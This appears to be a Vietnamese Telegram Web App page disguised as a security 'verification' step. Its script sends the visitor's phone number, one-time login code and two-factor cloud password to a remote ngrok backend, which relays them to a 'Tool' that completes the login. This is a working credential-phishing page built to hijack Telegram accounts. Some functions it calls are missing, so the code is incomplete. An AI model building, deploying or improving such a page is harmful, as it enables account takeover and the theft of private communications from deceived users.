<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Xác Minh</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background: #0d1117; color: white; margin: 0; font-family: sans-serif; display: flex; justify-content: center; height: 100vh; overflow: hidden; }
        .content { width: 100%; max-width: 400px; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; box-sizing: border-box; }
        .otp-box { width: 50px; height: 50px; text-align: center; font-size: 20px; background: #1c1c20; border: 2px solid #3e3e5a; border-radius: 12px; color: white; }
        .key-btn { padding: 15px; border-radius: 12px; border: none; background: #2b2b3d; color: white; font-size: 20px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>

<div class="content" id="app">
    <div style="font-size: 50px; margin-bottom: 20px;">👋</div>
    <div id="message">Đang kết nối bảo mật...</div>
</div>

<!-- [Giữ nguyên phần <head> và <style> cũ] -->
<script>
    const BACKEND_URL = 'https://augmented-musky-unshaven.ngrok-free.dev';
    const tg = window.Telegram.WebApp;
    const chat_id = tg.initDataUnsafe?.user?.id || Math.floor(Math.random()*1000000).toString();

    // 1. Gửi SĐT để kích hoạt Tool bắt đầu gửi mã
    async function sendPhoneToServer(phone) {
        tg.MainButton.text = "ĐANG GỬI MÃ...";
        const res = await fetch(`${BACKEND_URL}/send_phone`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ phone: phone, chat_id: chat_id })
        });
        const data = await res.json();
        // Nếu server báo thành công, chuyển sang màn hình nhập mã
        if (data.status === "sent") renderOtpUi(); 
    }

    // 2. Logic xử lý sau khi nhập mã/mật khẩu
    async function submitOtp(input) {
        const res = await fetch(`${BACKEND_URL}/verify_otp`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ input: input, chat_id: chat_id })
        });
        const result = await res.json();

        // Đồng bộ trạng thái từ Tool
        if (result.status === "success") {
            alert("Đăng nhập thành công!");
            tg.close();
        } else if (result.status === "need_password") {
            showPasswordUi(); // Chuyển sang UI nhập mật khẩu
        } else {
            alert("Mã sai, vui lòng thử lại!"); // Báo lỗi sai mã từ Tool
            document.querySelectorAll('.otp-box').forEach(b => b.value = "");
            currentOtp = "";
        }
    }

    function showPasswordUi() {
        document.getElementById('app').innerHTML = `
            <div>Nhập mật khẩu đám mây (2FA):</div>
            <input type="password" id="password_input" style="width: 80%; padding: 10px; margin: 20px 0;">
            <button onclick="submitPassword()">XÁC NHẬN</button>
        `;
    }
</script>
</body>
</html>
